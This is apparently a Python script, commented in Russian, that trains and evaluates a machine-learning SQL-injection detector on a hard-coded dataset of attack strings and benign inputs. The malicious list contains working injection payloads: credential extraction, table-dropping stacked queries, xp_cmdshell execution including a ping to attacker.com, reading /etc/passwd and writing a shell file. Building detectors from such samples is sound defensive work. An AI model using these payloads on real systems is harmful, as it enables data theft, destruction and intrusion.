"""
Расширенная система обучения ML модели для детектирования SQL инъекций
Включает большой датасет и продвинутые техники обучения
"""

import json
import logging
import numpy as np
from sklearn.model_selection import train_test_split, cross_val_score
from sklearn.metrics import classification_report, confusion_matrix, roc_auc_score
from typing import List, Tuple
from pathlib import Path

# Optional plotting libraries
try:
    import matplotlib.pyplot as plt
    import seaborn as sns
    HAS_PLOTTING = True
except ImportError:
    HAS_PLOTTING = False

from sql_injection_detector import MLDetector, SQLInjectionAgent

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ============================================================================
# РАСШИРЕННЫЙ ДАТАСЕТ
# ============================================================================

class SQLInjectionDataset:
    """Класс для управления датасетом SQL инъекций"""

    def __init__(self):
        self.malicious_samples = []
        self.safe_samples = []

    def load_default_dataset(self):
        """Загрузка дефолтного датасета"""

        # ВРЕДОНОСНЫЕ ЗАПРОСЫ (расширенный список)
        self.malicious_samples = [
            # Classic SQL Injection
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 'a'='a",
            "admin' --",
            "admin' #",
            "admin'/*",
            "' or 1=1--",
            "' or 1=1#",
            "' or 1=1/*",
            "') or '1'='1--",
            "') or ('1'='1--",

            # UNION-based
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL, NULL--",
            "' UNION SELECT NULL, NULL, NULL--",
            "' UNION ALL SELECT NULL, NULL, NULL--",
            "1' UNION SELECT username, password FROM users--",
            "' UNION SELECT @@version--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT column_name FROM information_schema.columns--",
            "1' UNION SELECT NULL, group_concat(username,':',password) FROM users--",

            # Boolean-based blind
            "' AND 1=1--",
            "' AND 1=2--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "' AND substring(@@version,1,1)='5",
            "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",

            # Time-based blind
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND BENCHMARK(5000000,MD5('test'))--",
            "'; SELECT pg_sleep(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",

            # Stacked queries
            "'; DROP TABLE users--",
            "1'; DELETE FROM users WHERE 'a'='a",
            "'; EXEC sp_MSForEachTable 'DROP TABLE ?'--",
            "1'; UPDATE users SET password='hacked' WHERE 'a'='a",
            "'; INSERT INTO users VALUES('hacker','pass')--",

            # Error-based
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "' AND 1=CAST((SELECT @@version) AS int)--",
            "' AND extractvalue(1, concat(0x7e, (SELECT @@version)))--",
            "' AND updatexml(1, concat(0x7e, (SELECT @@version)), 1)--",

            # Database enumeration
            "' AND 1=2 UNION SELECT table_schema,table_name FROM information_schema.tables--",
            "'; SELECT name FROM sysobjects WHERE xtype='U'--",
            "' UNION SELECT NULL, schema_name FROM information_schema.schemata--",
            "' UNION SELECT NULL, database()--",

            # Command execution
            "'; EXEC xp_cmdshell('dir')--",
            "'; EXEC master..xp_cmdshell 'ping attacker.com'--",
            "' UNION SELECT NULL, load_file('/etc/passwd')--",
            "' INTO OUTFILE '/var/www/html/shell.php'--",
            "' INTO DUMPFILE '/tmp/dump.txt'--",

            # Obfuscation techniques
            "' OR 1=1%00",
            "' OR 1=1%16",
            "' OR 1=1--+",
            "' OR 1=1-- -",
            "%27%20OR%201=1--",
            "&#39; OR &#39;1&#39;=&#39;1",
            "\\' OR \\'1\\'=\\'1",

            # Advanced techniques
            "' OR 'x'='x",
            "1' and (select count(*) from tablenames) >= 0 --",
            "' AND MID(VERSION(),1,1) = '5'",
            "' AND LENGTH(database())>0--",
            "' RLIKE (SELECT (CASE WHEN (1=1) THEN 0x61646d696e ELSE 0x28 END))--",
            "' AND JSON_EXTRACT(@@version,\"$[0]\")--",

            # NoSQL Injection (могут встречаться в веб-формах)
            "' || '1'=='1",
            "' && '1'=='1",
            "admin' || '1'=='1",
            "{\"$ne\": null}",
            "{\"$gt\": \"\"}",
            "'; return true; //",

            # Second-order injection
            "admin'--",
            "test' UNION SELECT 'injected",
            "' OR 1=1 UNION SELECT NULL, 'payload'--",

            # Encoded injections
            "0x61646d696e",  # hex encoded 'admin'
            "CHAR(65)||CHAR(68)||CHAR(77)||CHAR(73)||CHAR(78)",  # 'ADMIN'
            "0x270x6f0x720x270x310x270x3d0x2731",

            # Multiple encoding
            "%2527%20OR%201=1--",
            "%25%32%37%20OR%201=1--",
        ]

        # БЕЗОПАСНЫЕ ЗАПРОСЫ (расширенный список)
        self.safe_samples = [
            # Emails
            "john.doe@example.com",
            "user123@domain.co.uk",
            "test_user@subdomain.company.com",
            "firstname.lastname@mail.org",
            "admin@system.local",

            # Names
            "John Smith",
            "Mary-Jane Watson",
            "O'Brien",
            "José García",
            "Li Wei",
            "محمد علي",  # Arabic name

            # Usernames
            "user123",
            "john_doe_123",
            "admin-user",
            "test.user",
            "User@2024",

            # Product names/descriptions
            "MacBook Pro 16-inch",
            "Samsung Galaxy S23",
            "iPhone 15 Pro Max",
            "Product Description: High quality item",
            "Category: Electronics & Accessories",

            # Search queries
            "search term",
            "how to cook pasta",
            "best practices for coding",
            "python programming tutorial",
            "machine learning algorithms",

            # Addresses
            "123 Main Street, New York, NY 10001",
            "Apt 4B, 456 Park Avenue",
            "PO Box 789",
            "London, SW1A 1AA, United Kingdom",

            # Phone numbers
            "+1 (555) 123-4567",
            "+44 20 7946 0958",
            "555-0123",
            "(123) 456-7890",

            # URLs (legitimate)
            "https://www.example.com",
            "http://subdomain.domain.org/path/to/page",
            "https://api.service.com/v1/endpoint",
            "www.website.com/page?param=value",

            # Dates and times
            "2024-01-15",
            "01/15/2024",
            "15-Jan-2024",
            "2024-01-15 14:30:00",
            "Monday, January 15, 2024",

            # Numbers and IDs
            "123456",
            "ID: 98765",
            "Order #12345",
            "Invoice-2024-001",
            "REF: ABC123XYZ",

            # Text content
            "This is a normal comment",
            "Product review: Great quality!",
            "Description of the item goes here",
            "Please provide feedback",
            "Thank you for your order",

            # Code snippets (legitimate, not injection)
            "function hello() { return 'world'; }",
            "const x = 10;",
            "import numpy as np",
            "SELECT * FROM table_name",  # Just SQL keyword without injection
            "INSERT INTO table",  # Just SQL keyword

            # Special characters (but safe context)
            "Price: $99.99",
            "Discount: 20%",
            "Rating: 4.5/5",
            "Temperature: 72°F",
            "Size: 10' x 12'",

            # Multi-language
            "Привет мир",  # Russian
            "你好世界",  # Chinese
            "مرحبا بالعالم",  # Arabic
            "こんにちは世界",  # Japanese
            "Bonjour le monde",  # French

            # Technical terms
            "API endpoint",
            "RESTful service",
            "JSON response",
            "HTTP status code 200",
            "Authentication token",

            # Filenames
            "document.pdf",
            "image_2024.jpg",
            "report-final.xlsx",
            "backup_file.zip",
            "data.json",
        ]

        logger.info(f"Loaded {len(self.malicious_samples)} malicious and {len(self.safe_samples)} safe samples")

    def augment_data(self, factor: int = 5):
        """Аугментация данных для улучшения обучения"""
        augmented_malicious = list(self.malicious_samples)
        augmented_safe = list(self.safe_samples)

        # Добавляем вариации безопасных запросов
        for _ in range(factor):
            for sample in self.safe_samples[:20]:  # Берем только часть для вариаций
                # Добавляем пробелы
                augmented_safe.append("  " + sample + "  ")
                # Меняем регистр
                augmented_safe.append(sample.upper())
                augmented_safe.append(sample.lower())

        self.malicious_samples = augmented_malicious
        self.safe_samples = augmented_safe

        logger.info(f"After augmentation: {len(self.malicious_samples)} malicious, {len(self.safe_samples)} safe")

    def get_training_data(self) -> Tuple[List[str], List[int]]:
        """Получение данных для обучения"""
        X = self.malicious_samples + self.safe_samples
        y = [1] * len(self.malicious_samples) + [0] * len(self.safe_samples)
        return X, y

    def save_dataset(self, filepath: str):
        """Сохранение датасета"""
        data = {
            "malicious": self.malicious_samples,
            "safe": self.safe_samples
        }
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        logger.info(f"Dataset saved to {filepath}")

    def load_dataset(self, filepath: str):
        """Загрузка датасета из файла"""
        with open(filepath, 'r', encoding='utf-8') as f:
            data = json.load(f)
        self.malicious_samples = data['malicious']
        self.safe_samples = data['safe']
        logger.info(f"Dataset loaded from {filepath}")

# ============================================================================
# ОБУЧЕНИЕ И ОЦЕНКА
# ============================================================================

def train_and_evaluate(model_path: str = "sql_injection_model.pkl"):
    """Полный цикл обучения и оценки модели"""

    logger.info("=" * 70)
    logger.info("НАЧАЛО ОБУЧЕНИЯ ML МОДЕЛИ")
    logger.info("=" * 70)

    # 1. Загрузка датасета
    dataset = SQLInjectionDataset()
    dataset.load_default_dataset()
    dataset.augment_data(factor=3)

    # Сохраняем датасет для будущего использования
    dataset.save_dataset("training_dataset.json")

    # 2. Подготовка данных
    X, y = dataset.get_training_data()
    logger.info(f"Total samples: {len(X)} (Malicious: {sum(y)}, Safe: {len(y) - sum(y)})")

    # 3. Разделение на train/test
    X_train, X_test, y_train, y_test = train_test_split(
        X, y, test_size=0.2, random_state=42, stratify=y
    )
    logger.info(f"Train size: {len(X_train)}, Test size: {len(X_test)}")

    # 4. Обучение модели
    logger.info("Training ML model...")
    detector = MLDetector()
    detector.train(X_train, y_train)

    # 5. Оценка на тестовой выборке
    logger.info("\n" + "=" * 70)
    logger.info("ОЦЕНКА МОДЕЛИ НА ТЕСТОВОЙ ВЫБОРКЕ")
    logger.info("=" * 70)

    y_pred = []
    y_proba = []

    for sample in X_test:
        is_mal, confidence = detector.predict(sample)
        y_pred.append(1 if is_mal else 0)
        y_proba.append(confidence)

    # Метрики
    print("\nClassification Report:")
    print(classification_report(y_test, y_pred, target_names=['Safe', 'Malicious']))

    print("\nConfusion Matrix:")
    cm = confusion_matrix(y_test, y_pred)
    print(cm)

    # ROC AUC
    roc_auc = roc_auc_score(y_test, y_proba)
    print(f"\nROC AUC Score: {roc_auc:.4f}")

    # 6. Сохранение модели
    detector.save_model(model_path)
    logger.info(f"Model saved to {model_path}")

    # 7. Тестирование на примерах
    logger.info("\n" + "=" * 70)
    logger.info("ТЕСТИРОВАНИЕ НА ПРИМЕРАХ")
    logger.info("=" * 70)

    test_cases = [
        ("john.doe@example.com", False),
        ("' OR '1'='1", True),
        ("Product123", False),
        ("admin' --", True),
        ("Normal search query", False),
        ("1' UNION SELECT * FROM users--", True),
        ("https://example.com", False),
        ("'; DROP TABLE users--", True),
    ]

    print("\nTest Cases:")
    for text, expected_malicious in test_cases:
        is_mal, conf = detector.predict(text)
        status = "✓" if is_mal == expected_malicious else "✗"
        print(f"{status} '{text[:50]}' -> Malicious: {is_mal}, Confidence: {conf:.3f}")

    logger.info("\n" + "=" * 70)
    logger.info("ОБУЧЕНИЕ ЗАВЕРШЕНО")
    logger.info("=" * 70)

    return detector

# ============================================================================
# CLI INTERFACE
# ============================================================================

def interactive_test():
    """Интерактивное тестирование модели"""
    print("\n" + "=" * 70)
    print("ИНТЕРАКТИВНОЕ ТЕСТИРОВАНИЕ")
    print("=" * 70)
    print("Введите текст для проверки (или 'exit' для выхода)")
    print()

    agent = SQLInjectionAgent(ml_model_path="sql_injection_model.pkl")

    while True:
        text = input("Текст: ").strip()

        if text.lower() == 'exit':
            break

        if not text:
            continue

        result = agent.analyze(text)

        print(f"\n{'='*70}")
        print(f"Результат анализа:")
        print(f"  Вредоносный: {result.is_malicious}")
        print(f"  Уверенность: {result.confidence:.2%}")
        print(f"  Метод детектирования: {result.detection_method}")
        print(f"  Риск-скор: {result.risk_score:.2%}")
        if result.matched_patterns:
            print(f"  Совпавшие паттерны: {', '.join(result.matched_patterns)}")
        print(f"{'='*70}\n")

# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    import sys

    if len(sys.argv) > 1 and sys.argv[1] == "interactive":
        interactive_test()
    else:
        # Полный цикл обучения
        train_and_evaluate("sql_injection_model.pkl")

        # Предложение интерактивного тестирования
        print("\nХотите протестировать модель? (y/n): ", end="")
        if input().lower() == 'y':
            interactive_test()
